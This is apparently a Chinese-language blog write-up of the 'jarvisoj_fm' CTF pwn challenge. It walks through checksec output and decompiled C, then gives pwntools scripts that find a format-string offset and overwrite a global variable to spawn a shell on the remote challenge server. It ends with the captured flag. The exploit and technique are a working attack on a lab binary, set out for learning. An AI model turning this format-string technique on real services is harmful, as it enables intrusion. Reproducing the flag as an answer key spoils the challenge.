---
title: jarvisoj_fm
date: 2023-10-24
categories:
  - CTF
  - Pwn
---

## 前置工作

先来个 CheckSec，结果如下

```bash
┌──(ela㉿kali)-[~/Pwn]
└─$ checksec fm                    
[*] '/home/ela/Pwn/fm'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

有 Canary 和 NX，先看看再说吧

用 IDA 打开主程序

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[80]; // [esp+2Ch] [ebp-5Ch] BYREF
  unsigned int v5; // [esp+7Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  be_nice_to_people();
  memset(buf, 0, sizeof(buf));
  read(0, buf, 0x50u);
  printf(buf);
  printf("%d!\n", x);
  if ( x == 4 )
  {
    puts("running sh...");
    system("/bin/sh");
  }
  return 0;
}
```

发现获得 Shell 的方法就是把 `x` 嗯改成 `4`，而 `x` 原本的值为 `3`，再看一眼 `x` 的地址，是 `0x804A02C`

可以靠格式化字符串 `printf()` 漏洞来强行更改 `x`，但首先我们需要知道格式化字符串的偏移量

## 计算偏移

```python
from pwn import *

io = remote("node4.buuoj.cn", 26068)
io.sendline("aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p")
io.interactive()
```

得到的结果如下

```
aaaa-0xffd92ffc-0x50-(nil)-0xf7f94000-0xf7f94918-0xffd93000-0xffd930f4-(nil)-0xffd93094-0x32-0x61616161-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d
```

字符串 `aaaa` 对应的 16 进制应当为 `0x61616161`，于是我们可以看出偏移为 `11` 位

## 编写 Exp

直接使用 Pwntools 自带的 `fmtstr_payload()` 函数构建 Payload

```python
from pwn import *

io = remote("node4.buuoj.cn", 26068)
x_addr = 0x804A02C
payload = fmtstr_payload(11, {x_addr: 4})
io.sendline(payload)
io.interactive()

```

最后得到 Flag 为 `flag{22911b79-0cff-434b-9233-47389f152a6c}`